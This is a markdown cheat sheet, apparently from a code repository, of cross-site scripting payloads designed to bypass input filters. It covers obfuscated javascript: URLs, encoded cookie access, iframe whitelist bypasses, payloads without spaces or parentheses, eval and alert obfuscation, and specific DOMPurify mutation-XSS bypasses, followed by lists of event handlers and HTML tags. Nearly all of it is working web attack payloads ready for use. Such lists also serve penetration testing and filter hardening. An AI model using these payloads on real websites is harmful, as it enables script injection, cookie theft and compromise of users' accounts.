# XSS-Bypass-Filters

### Redirection
```js
document.location=
document['location']=
window.location=
this["window"]["location"]=
document.location.href=
location.href=
location=
window.location.assign()
window['location']['href']=
document.location.replace()
window.open("link", "_blank");
```

### Link

```js
//google.com/?=a
//134744072:1234/?a= (decimal ip)
```

### Cookies

```js
document.cookie 
document['cookie']
with(document)alert(cookie)
doc\u0075ment.cookie
doc\u0075ment['cookie']
window["doc"+"ument"]["cookie"]
```

### Href

```
<!--javascript -->
javascript:alert(1)
JaVaScript:alert(1)
ja&Tab;vascript:alert(1)
java\tscript:alert(1)
ja&NewLine;vascript:alert(1)
ja&#x0000A;vascript:alert(1)
java&#x73;cript:alert()
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')

# tab (0x9), newline (0xa) and carriage return (0xd) allowed 

ja
vascript:alert(1) # New line 

jav	asc	ript	:alert(1) # Tab

# Special Characters (you can use them before Raw or encode) Somes Example :
http://www.unicode-symbol.com/u/0017.html
http://www.unicode-symbol.com/u/0008.html

&#23;javascript:alert('Successful XSS') # ETB HTML
&#x8;javascript:alert(1) # Backspace HTML


<!--::colon:: -->
javascript&colon;alert()
javascript&#x0003A;alert()
javascript&#58;alert(1)
javascript&#x3A;alert()

<!-- alert -->
#HTML entities/encode:
javascript:alert&lpar;&rpar;
javascript:al&#x65;rt``

#url encoding:
javascript:alert%60%60
javascript:x='%27-alert(1)-%27';
javascript:%61%6c%65%72%74%28%29

#JS unicode 
javascript:a\u006Cert``"
javascript:\u0061\u006C\u0065\u0072\u0074``
```

### Email 
```js
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

### Iframe
```js
<iframe src="javascript:alert('XSS')"> #use href bypass
<iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
<iframe src="https://google.com@evil.domain">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
```

### Without Space
```js
<img/src/onerror=alert(1)>
<svg/onload=alert(2)>
```

### Without dot 
```
<script src=//0x8ac5c30a>
```

### Without parentheses
https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
```
<svg/onload='alert&#40 23 &#41'> 
location=/javascript:alert%2823%29/.source;
```
### 20 Chars MAX: 
https://jlajara.gitlab.io/XSS_20_characters

### Some random payloads
```
'-alert(1)-'
"-alert(1)-"
);alert(1)//
';alert(1)//
";alert(1)//
"><img/src/onerror=alert(1)>//
'><img/src/onerror=alert(1)>//
>"@input="this.alert`1`
>'@input="this.alert`1`
&quot onerror='alert(1)'
' onerror='alert(1)'
" onerror='alert(1)'
```

## Escaping comments by closing tag 
```
<script>
  // comment </script>XSS
 /* comment </script>XSS
</script>
```

### Alert
```js
var{a:onerror}={a:alert};throw%20document.cookie
alert(1)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
eval('ale'+'rt(0)');
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();
top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);
open('java'+'script:ale'+'rt(11)');
setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

## DOMPurify 

### <2.1
```js
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">

<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">

<math><mtext><table><mglyph><style><!--</style><img title=&quot;--></mglyph><img	src=1	onerror=alert(1)>">
```
### <2.0.1
```js
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
```

## Events
```js
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforescriptexecute
onbeforeunload
onbegin
onblur
onbounce
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfinish
onfocus
onfocusin
onfocusout
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadend
onloadstart
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onshow
onstart
onsubmit
ontimeupdate
ontoggle
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
```
## HTML Tags
```
a
abbr
acronym
address
applet
area
article
aside
audio
b
base
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
image
img
input
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
svg -> animate
svg -> animatemotion
svg -> animatetransform
svg -> set
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
wbr
xmp
```

### SRC

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://gist.github.com/xsuperbug/1aff5c1d5ddbfefb035f33dd9c8e8a72
- https://netsec.expert/posts/xss-in-2021/#double-encoding

